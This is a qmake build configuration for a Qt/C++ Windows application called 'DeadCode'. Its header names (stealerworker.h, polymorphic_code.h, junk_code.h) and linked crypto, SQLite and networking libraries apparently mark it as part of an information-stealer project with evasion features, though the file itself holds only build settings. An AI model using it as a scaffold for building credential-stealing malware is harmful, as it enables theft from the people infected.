QT += core gui network widgets sql

TARGET = DeadCode
TEMPLATE = app
CONFIG += release c++17

SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

FORMS += \
    mainwindow.ui

RC_FILE = ../icon.rc

INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-mingw-dynamic/include

LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
        -lsqlite3 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32 \
        -luser32 \
        -ladvapi32 \
        -lwininet \
        -lshell32 \
        -lurlmon \
        -lole32

QMAKE_CXXFLAGS += -O2 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS

QMAKE_LFLAGS += -O2 \
                -Wl,-subsystem,windows \
                -mthreads

DEFINES += BUILD_DATE=\\\"$${QMAKE_BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${QMAKE_BUILD_VERSION}\\\"

DESTDIR = ../build/release
OBJECTS_DIR = ../build/release
MOC_DIR = ../build/release
UI_DIR = ../build/release

QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h

win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = ../build/debug
        OBJECTS_DIR = ../build/debug
        MOC_DIR = ../build/debug
        UI_DIR = ../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h
    }
}

PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h \
    $$UI_DIR/ui_mainwindow.h